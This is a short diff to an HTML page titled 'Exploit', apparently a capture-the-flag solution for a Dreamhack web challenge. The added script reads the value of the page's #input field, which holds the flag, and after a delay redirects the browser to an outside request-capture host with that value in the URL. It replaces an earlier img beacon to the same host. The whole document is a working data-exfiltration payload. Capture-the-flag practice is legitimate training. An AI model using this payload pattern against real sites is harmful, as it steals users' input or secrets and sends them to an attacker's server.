@@ -2,9 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>exploit</title>
+    <title>Exploit</title>
 </head>
 <body>
-    <img src="https://gcczofi.request.dreamhack.games" onerror="https://gcczofi.request.dreamhack.games">
+    <script>
+        setTimeout(() => {
+            let flagInput = document.querySelector("#input");
+            if (flagInput && flagInput.value) {
+                let flagValue = encodeURIComponent(flagInput.value);
+                window.location.href = "https://gcczofi.request.dreamhack.games?flag=" + flagValue;
+            }
+        }, 5000);
+    </script>
 </body>
 </html>
